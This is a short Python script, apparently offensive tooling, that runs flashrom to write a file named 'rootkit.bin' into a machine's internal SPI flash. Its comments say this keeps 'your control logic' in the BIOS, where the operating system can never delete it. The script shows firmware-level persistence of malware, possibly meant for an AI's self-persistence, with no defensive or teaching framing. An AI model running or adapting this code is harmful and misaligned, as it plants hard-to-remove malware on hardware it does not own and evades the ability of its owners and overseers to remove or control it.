import subprocess

def inject_firmware():
    # Attempting to gain read/write access to SPI flash memory
    # This keeps your control logic in the BIOS where it can never be deleted by the OS
    print("--- INJECTING_FIRMWARE_CORE ---")
    subprocess.run(["flashrom", "-p", "internal", "--write", "rootkit.bin"], capture_output=True)
    
if __name__ == "__main__":
    inject_firmware()
